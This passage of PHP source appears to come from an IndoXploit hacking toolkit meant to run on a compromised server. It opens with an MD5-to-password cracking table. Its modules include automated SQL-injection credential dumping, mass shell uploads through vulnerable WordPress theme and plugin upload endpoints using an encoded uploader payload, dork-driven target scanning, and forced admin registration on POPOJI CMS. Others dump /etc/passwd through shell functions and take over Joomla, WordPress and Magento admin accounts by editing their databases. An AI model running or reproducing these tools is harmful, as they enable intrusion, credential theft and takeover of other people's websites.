"fe01ce2a7fbac8fafaed7c982a04e229" => "demo",
"04e484000489dd3b3fb25f9aa65305c6" => "redaksi2016",
"91f5167c34c400758115c2a6826ec2e3" => "administrador",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"c93ccd78b2076528346216b3b2f701e6" => "admin1234",
"912ec803b2ce49e4a541068d495ab570" => "asdf",
"1adbb3178591fd5bb0c248518f39bf6d" => "asdf1234",
"e99a18c428cb38d5f260853678922e03" => "abc123",
"a152e841783914146e4bcd4f39100686" => "asdfgh",
"a384b6463fc216a5f8ecb6670f86456a" => "qwert",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"b59c67bf196a4758191e42f76670ceba" => "1111",
"96e79218965eb72c92a549dd5a330112" => "111111",
"4297f44b13955235245b2497399d7a93" => "123123",
"c33367701511b4f6020ec61ded352059" => "654321",
"81dc9bdb52d04dc20036dbd8313ed055" => "1234",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"25f9e794323b453885f5181f1b624d0b" => "123456789",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"befe9f8a14346e3e52c762f333395796" => "qawsed",
"76419c58730d9f35de7ac538c2fd6737" => "qazwsx",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"bed128365216c019988915ed3add75fb" => "passw0rd",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"f379eaf3c831b04de153469d1bec345e" => "666666",
"96e79218965eb72c92a549dd5a330112" => "111111",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"6f3cac6213ffceee27cc85414f458caa" => "siteadmin",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"63a9f0ea7bb98050796b649e85481845" => "root",
"4297f44b13955235245b2497399d7a93" => "123123",
"c8837b23ff8aaa8a2dde915473ce0991" => "123321",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"4ca7c5c27c2314eecc71f67501abb724" => "letmein123",
"cc03e747a6afbbcbf8be7668acfebee5" => "test123",
"62cc2d8b4bf2d8728120d052163a77df" => "demo123",
"32250170a0dca92d53ec9624f336ca24" => "pass123",
"46f94c8de14fb36680850768ff1b7f2a" => "123qwe",
"200820e3227815ed1756a6b531e7e0d2" => "qwe123",
"c33367701511b4f6020ec61ded352059" => "654321",
"f74a10e1d6b2f32a47b8bcb53dac5345" => "loveyou",
"172eee54aa664e9dd0536b063796e54e" => "adminadmin123",
"e924e336dcc4126334c852eb8fadd334" => "waskita1234",
"02631cc1d0cc5bda188566e90d0ae16c" => "rsamku2013",
"b69cbef044eac6fc514a2988e62c5b30" => "unlock08804",
"12e110a1b89da9b09a191f1f9b0a1398" => "nalaratih",
"f70d32432ff0a8984b5aadeb159f9db6" => "Much240316",
"a2fffa77aa0dde8cd4c416b5114eba21" => "gondola",
"2b45af95ce316ea4cffd2ce4093a2b83" => "w4nd3szaki",
"c5612a125d8613ddae79a6b36c8bee37" => "Reddevil#21",
"6e7fbe8e6147e2c430ce7e8ab883e533" => "R4nd0m?!",
"5136850b6c8f3ebc66122188347efda0" => "adminku",
"5214905fbe8d7f0bb0d0a328f08af3f0" => "adminpust4k4",
"acfc976c2d22e4a595a9ee6fc0d05f27" => "dikmen2016",
"dcdee606657b5f7d8b218badfeb22a90" => "masputradmin",
"ecb4208ee41389259a632d3a733c2786" => "741908",
"827ccb0eea8a706c4c34a16891f84e7b" => "12345",
"855be097acdf2fea4e342615a154ca3c" => "tolol",
"eeee80342778e7b497d507f89094b10d" => "master10",
"d29c0398602e6cf005f0dcb7a0443c7d" => "adminjalan",
"9062756924cf10763cc89cf2793a77ab" => "pass4@nd1",
"8b6bc5d8046c8466359d3ac43ce362ab" => "ganteng",
"528d06a172eb2d8fab4e93f33f3986a8" => "jasindolive",
"058fe7f85df1e992ef7bf948f1db7842" => "404J",
"abe1f4492f922a9111317ed7f7f8e723" => "bantarjati5",
);
$sites = explode("\r\n", htmlspecialchars($_POST['target']));
if(isset($_POST['go'])) {
    foreach($sites as $url) {
        if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
            $url = "http://$url";
        } else {
            $url = $url;
        }
        $statis = "";
        $sisa = "";
        $login = "";
        $param_list = array("statis","kategori","berita");
        $curl = ngcurl($url);
        $curl = str_replace("'", '"', $curl);
        foreach($param_list as $param) {
            preg_match_all("/$param-(.*?)\">/", $curl, $id);
            foreach($id[1] as $stat) {
                $pecah = explode("-", $stat);
                $statis .= $pecah[0];
                $sisa .= $pecah[1];
                break;
            }
            foreach($admin as $adminweb) {
                $curl_admin = ngcurl("$url/$adminweb");
                if(preg_match("/administrator|username|password/i", $curl_admin) AND !preg_match("/not found|forbidden|404|403|500/i", $curl_admin)) {
                    $login .= "$url/$adminweb";
                    break;
                }
            }
            $sql = ngcurl("$url/$param-$statis'/*!50000UniON*/+/*!50000SeLeCT*/+/*!50000cOnCAt*/(0x696e646f78706c6f6974,0x3c6c693e,username,0x20,password,0x3c6c693e)+from+users--+---+-$sisa");
            preg_match("/<meta name=\"description\" content=\"(.*?)\">/", $sql, $up);
            preg_match("/<li>(.*)<li>/", $up[1], $akun);
            $data = explode(" ", $akun[1]);
            echo "<center>[+] URL: $url\n<center>";
            //echo "[+] param: $param\n";
            if(htmlspecialchars($curl) !== htmlspecialchars($sql)) {
                if(preg_match("/indoxploit/", $sql)) {
                    //echo "[ Injection Successfully ]\n";
                    if($data[0] == "" || $data[1] == "") {
                        echo "[+] Not Injected :(\n\n";
                        break;
                    } else {
                        echo "[+] username: ".$data[0]."\n";
                        $passwd = $real_pass[$data[1]];
                        if($passwd == "") {
                            $passwd = $data[1];
                            simpen($data[1]);
                        }
                        echo "[+] password: $passwd\n";
                    }
                    if($login == "") {
                        echo "[+] Login Admin ga ketemu :(\n\n";
                    } else {
                        echo "[+] Login: $login\n\n";
                    }
                    break;
                } else {
                    echo "<center>[+] Not Injected :(\n\n</center>";
                    break;
                }
            } else {
                echo "<center>[+] Not Injected :(\n\n</center>";
                break;
            }
        }
    }
}
}elseif($_GET['do'] == 'u-design_exploit'){
echo '
<html>
<center>
<h1>WordPress U-Design Themes Mass Xploiter</h1>
<form method="post" enctype="multipart/form-data">
Shellname: <br><input type="text" name="filename" style="width: 500px;" height="10" value="indoxploit.php" required><br>
Target: <br><textarea name="url" style="width: 500px; height: 200px;" placeholder="http://www.target.com/"></textarea><br>
<input type="submit" name="exp" value="Hajar!" style="width: 500px;">
</form>';
set_time_limit(0);
error_reporting(0);
 
function buffer() {
    ob_flush();
    flush();
}
function curl($url, $payload) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
          curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res = curl_exec($ch);
          curl_close($ch);
    return $res;
}
function cek($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res = curl_exec($ch);
          curl_close($ch);
    return $res;
}
$file = htmlspecialchars($_POST['filename']);
$site = explode("\r\n", $_POST['url']);
$do = $_POST['exp'];
$uploader = base64_decode("PD9waHANCmVjaG8gIkluZG9YcGxvaXQgLSBBdXRvIFhwbG9pdGVyIFUtRGVzaWduIjsNCmVjaG8gIjxicj4iLnBocF91bmFtZSgpLiI8YnI+IjsNCmVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+DQo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4Jz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPg0KPC9mb3JtPiI7DQppZigkX1BPU1RbJ3VwbG9hZCddKSB7DQoJaWYoQGNvcHkoJF9GSUxFU1snaWR4J11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2lkeCddWyduYW1lJ10pKSB7DQoJZWNobyAic3Vrc2VzIjsNCgl9IGVsc2Ugew0KCWVjaG8gImdhZ2FsIjsNCgl9DQp9DQo/Pg==");
if($do) {
    $idx_dir = mkdir("indoxploit_tools", 0755);
    $shell = "indoxploit_tools/".$file;
    $fopen = fopen($shell, "w");
    fwrite($fopen, $uploader);
    fclose($fopen);
    foreach($site as $url) {
        $target = $url.'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php';
        $data = array(
            "Filedata" => "@$shell"
            );
        $curl = curl($target, $data);
        if($curl) {
            $cek = cek($url.'/'.$file);
            if(preg_match("/IndoXploit/i", $cek)) {
                echo "<a href='$url/$file' target='_blank'>$url/$file</a> -> shellmu<br>";
            }
        }
    buffer();
    }
}
}elseif($_GET['do'] == 'u-design_dorker'){
echo '
<html>
<form method="post">
<center>
<h1>WordPress U-Design Theme Mass Xploiter</h1>
Dork: <input type="text" name="dork" placeholder="inurl:/wp-content/themes/u-design" size="50" height="10">
<input type="submit" value="scan">
</center>
</form>
</html>';
class indoxploit {
    public $dork;
    public function google($dork, $page) {
        $kunAPI = "AIzaSyDYG1FME1N7meBZLcywY7VojMHmtUAUIzY";
        $dork = urlencode($dork);
        $url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz=8&q={$dork}&key=$kunAPI&start={$page}";
        $output = json_decode($this->http_getx($url, true), true);
        if($output) {
            return $output;
        } else {
            return false;
        }
    }
    public function http_getx($url, $safemode = false) {
        if($safemode === true) sleep(1);
        $im = curl_init($url);
        curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($im, CURLOPT_HEADER, 0);
        return curl_exec($im);
        curl_close();
    }
    public function buffer() {
        ob_flush();
        flush();
    }
   
}
$dorker = new indoxploit;
$dork = $dorker->dork = $_POST['dork'];
if(isset($dork)) {
    $data = $dorker->google($dork, "0");
    $dorker->buffer();
    if($data) {
        foreach($data['responseData']['cursor']['pages'] as $key => $data_page) {
            $data = $dorker->google($dork, $data_page['start']);
            foreach($data['responseData']['results'] as $key => $load_data) {
                if($_SESSION[$load_data['visibleUrl']]) {
                } else {
                    $_SESSION[$load_data['visibleUrl']] = "1";
                    $url = "http://".$load_data['visibleUrl']."/";
                    echo $url."<br>";
                $dorker->buffer();
                }
            }
        }
    $dorker->buffer();
    } else {
        echo "google captcha.";
    }
}
}elseif($_GET['do'] == 'popoji_add_admin'){
echo '
<html>
<head>
<title>POPOJI CMS Add Admin Auto Registration</title>
<meta name="author" content="IndoXploit">
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
    color: #ffffff;
}
header {
    color: lime;
    font-size: 35px;
    margin: 10px auto;
    text-align: center;
    text-decoration: underline;
}
input[type=text] {
    border: 1px solid #008000;
    color: #7FFFFF;
    width: 500px;
    height: 20px;
    padding-left: 5px;
    margin: 5px auto;
    background: transparent;
}
input[type=submit] {
    border: 1px solid #008000;
    color: #7FFFFF;
    background: transparent;
    width: 500px;
}
textarea {
    background: transparent;
    color: #7FFFFF;
    border: 1px solid #008000;
    resize: none;
    width: 500px;
    height: 250px;
    padding-left: 5px;
    margin: 5px auto;
}
a {
    text-decoration: none;
    color: lime;
}
a:hover {
    text-decoration: underline;
}
</style>
</head>';
set_time_limit(0);
error_reporting(0);
 
function dav($url, $post=null) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, $url);
          if($post != null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
          }
          curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HHTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HEADER, 0);
    return curl_exec($ch);
          curl_close($ch);
}
 
$sites = explode("\r\n", $_POST['url']);
$user = "indoxploit";
$pass = $user;
$email = htmlspecialchars($_POST['email']);
if($_POST['hajar']) {
    echo "<span style='font-size: 25px; text-decoration: underline; color: lime; margin-bottom: 20px;'>Result Gannnnn</span><p>";
    if(!filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
        foreach($sites as $url) {
            if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
                $url = "http://".$url;
            } else {
                $url = $url;
            }
            echo "[+] Nyecan -> $url<br>";
            $post_register = array(
                "username" => $user,
                "email" => $email,
                "password" => $pass,
                "re-password" => $pass,
                );
            $register = dav("$url/po-admin/actregister.php", $post_register);
            echo "[+] Register ";
            if(!preg_match("/404|headers already sent|disabled for security reasons|Please type another email!/", $register) AND preg_match("/SUCCESS!!!|>Check your email for next step. Thank you!/", $register)) {
                echo "<font color=lime>OK!</font><br>";
                echo "[+] <font color=gold>Cek emailmu buat aktivasi</font><br>";
                echo "[+] u/p: <font color=lime>$user</font><br><br>";
                $post_login = array(
                    "username" => $user,
                    "password" => $pass,
                    );
            } else {
                echo "<font color=red>Gagal!</font><br><br>";
            }
        }
    } else {
        echo "<font color=red>Emailmu ga valid bosss, email harus valid biar bisa masuk token registrasinyaa.</font>";
    }
} else {
echo '
<center>
<header>POPOJI Auto Registration</header>
<form method="post">
Email: <br>
<input type="text" name="email" placeholder="email@asu.com" required><br>
Domains: <br>
<textarea name="url" placeholder="http://www.target.com"></textarea><br>
<input type="submit" name="hajar" value="Xploit!">
</form>
</center>';
}
}elseif($_GET['do'] == 'tevolution'){
echo '
<html>
<center>
<h1><strong>Tevolution Mass Upload Shell</strong></h1>
<form method="post" enctype="multipart/form-data">
Shellname: <br><input type="text" name="filename" style="width: 500px;" height="10" value="indoxploit.php.xxxjpg" required><br>
Target: <br><textarea name="url" style="width: 500px; height: 200px;" placeholder="http://www.target.com/"></textarea><br>
<input type="submit" name="exp" value="Hajar!" style="width: 500px;">
</form>';
set_time_limit(0);
error_reporting(0);
 
function buffer() {
    ob_flush();
    flush();
}
function curl($url, $payload) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
          curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res = curl_exec($ch);
          curl_close($ch);
    return $res;
}
$file = htmlspecialchars($_POST['filename']);
$site = explode("\r\n", $_POST['url']);
$do = $_POST['exp'];
$uploader = base64_decode("PD9waHANCmVjaG8gIkluZG9YcGxvaXQgLSBBdXRvIFhwbG9pdGVyIjsNCmVjaG8gIjxicj4iLnBocF91bmFtZSgpLiI8YnI+IjsNCmVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+DQo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4Jz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPg0KPC9mb3JtPiI7DQppZigkX1BPU1RbJ3VwbG9hZCddKSB7DQoJaWYoQGNvcHkoJF9GSUxFU1snaWR4J11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2lkeCddWyduYW1lJ10pKSB7DQoJZWNobyAic3Vrc2VzIjsNCgl9IGVsc2Ugew0KCWVjaG8gImdhZ2FsIjsNCgl9DQp9DQo/Pg==");
if($do) {
    $y = date("Y");
    $m = date("m");
    $idx_dir = mkdir("indoxploit_tools", 0755);
    $shell = "indoxploit_tools/".$file;
    $fopen = fopen($shell, "w");
    fwrite($fopen, $uploader);
    fclose($fopen);
    foreach($site as $url) {
        $target = $url.'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php';
        $cek_shell = "$url/wp-content/uploads/$y/$m/$file";
        $data = array(
            "Filedata" => "@$shell"
            );
        $curl = curl($target, $data);
        if($curl) {
            $cek = file_get_contents($cek_shell);
            if(preg_match("/IndoXploit - Auto Xploiter/is", $cek)) {
                echo "<a href='$cek_shell' target='_blank'>$cek_shell</a> -> shellmu<br>";
            }
        }
    buffer();
    }
}
}elseif($_GET['do'] == 'sqli_scanner'){
function cover() {
    print "<center>";
    print " ******        SQL Scanner via Bing Dorker         ******<br><br>";
    print " *****      Coded by l0c4lh34rtz - IndoXploit       *****<br><br>";
    print " ****  Sanjungan Jiwa - Jancok Sec - Res7ock Crew    ****<br><br>";
    print "</center>";
}
cover();
echo '<center>
<form method="post" action="">
      Dork: <input type="text" name="dork" placeholder=\'"page.php?id=1" site:it\' style="width: 300px; height: 25px;">
      <input type="submit" value=">>" name="submit">
</form>
	</center>';
$dork = htmlspecialchars($_POST['dork']);
$do = urlencode($dork);
if(isset($_POST['submit'])) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$do."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    foreach($allLinks as $url) {
        $urls = parse_url($url, PHP_URL_HOST);
        $urls = "http://$urls/";
        if($_SESSION[$urls]) {
            //
        } else {
            $_SESSION[$urls] = "1";
            if(inject($url)) {
                echo " $url -> Vuln!!<br>";
                simpen($url);
            }
        }
    }
}
$error[] = 'You have an error in your SQL';
$error[] = 'supplied argument is not a valid MySQL result resource in';
$error[] = 'Division by zero in';
$error[] = 'Call to a member function';
$error[] = 'Microsoft JET Database';
$error[] = 'ODBC Microsoft Access Driver';
$error[] = 'Microsoft OLE DB Provider for SQL Server';
$error[] = 'Unclosed quotation mark';
$error[] = 'Microsoft OLE DB Provider for Oracle';
$error[] = 'Incorrect syntax near';
$error[] = 'SQL query failed';
$error[] = 'Warning: filesize()';
$error[] = 'Warning: preg_match()';
$error[] = 'Warning: array_merge()';
$error[] = 'Warning: mysql_query()';
$error[] = 'Warning: mysql_num_rows()';
$error[] = 'Warning: session_start()';
$error[] = 'Warning: getimagesize()';
$error[] = 'Warning: mysql_fetch_array()';
$error[] = 'Warning: mysql_fetch_assoc()';
$error[] = 'Warning: is_writable()';
$error[] = 'Warning: Unknown()';
$error[] = 'Warning: mysql_result()';
$error[] = 'Warning: pg_exec()';
$error[] = 'Warning: require()';
 
function getsource($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
function inject($url) {
    $data = getsource(str_replace("=", "='", $url));
    $errors = implode("|", $GLOBALS['error']);
    return preg_match("#{$errors}#i", $data);
}
function simpen($isi) {
    $f = fopen("result_sql.txt","a+");
    fwrite($f, "$isi<br>");
    fclose($f);
}
}elseif($_GET['do'] == 'mass_mail'){
if(isset($_POST['send'])){ $email = $_POST['email'];$subject = $_POST['subject'];$from = $_POST['fromEmail'];$message = $_POST['message'];if($email&&$subject&&$from&&$message){$emails = explode(";", $email);foreach($emails as $email){mail($email, $subject, $message, "From: ".$from);	}}}
echo '
<center><strong>Mass Mailer</strong></center>
<center><p>Selamat Menggunakan Ndan ^_^</p></center>
<form action="" method="post">
	<table align="center">
		<tr>
		<td>To Email(s) : &nbsp;</td>
		<td><input type="text" style="background-color:#010101;color:#7FFFFF;border:1px solid #7FFFFF;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="email" placeholder="email@address.com" />
		</tr>
		<tr>
		<td>Subject : &nbsp;</td>
		<td>
		<input type="text" style="background-color:#010101;color:#7FFFFF;border:1px solid #7FFFFF;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px" name="subject" />
		</td>
		</tr>
		<tr><td>From Email : &nbsp;</td><td><input type="email" style="background-color:#010101;color:#7FFFFF;border:1px solid #7FFFFF;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px;" name="fromEmail" placeholder="example@google.com" /></td>
		</tr>
		<tr><td>Message : &nbsp;</td><td></td></tr>
	</table>
	<table align="center">
		<tr><td>
		<textarea style="background-color:#010101;color:#7FFFFF;border:1px solid #7FFFFF;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; height:200px;width:290px;" name="message"></textarea>
		</td></tr>
		<tr><td><input type="submit" name="send" value="Send Message(s)" /></td></tr>
	</table>
</form>';	
}elseif($_GET['do'] == 'etcpler'){
    echo "<center>Bypass etc/passw With:<br>
<table style='width:50%' align='center'>
  <tr>
    <td><form method='post'><input type='submit' value='System Function' name='syst'></form></td>
    <td><form method='post'><input type='submit' value='Passthru Function' name='passth'></form></td>
    <td><form method='post'><input type='submit' value='Exec Function' name='ex'></form></td>  
    <td><form method='post'><input type='submit' value='Shell_exec Function' name='shex'></form></td>      
    <td><form method='post'><input type='submit' value='Posix_getpwuid Function' name='melex'></form></td>
</tr></table><center>Bypass User With : <table style='width:50%' align='center'>
<tr>
    <td><form method='post'><input type='submit' value='Awk Program' name='awkuser'></form></td>
    <td><form method='post'><input type='submit' value='System Function' name='systuser'></form></td>
    <td><form method='post'><input type='submit' value='Passthru Function' name='passthuser'></form></td>  
    <td><form method='post'><input type='submit' value='Exec Function' name='exuser'></form></td>      
    <td><form method='post'><input type='submit' value='Shell_exec Function' name='shexuser'></form></td>
</tr>
</table></center><br>";
    if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
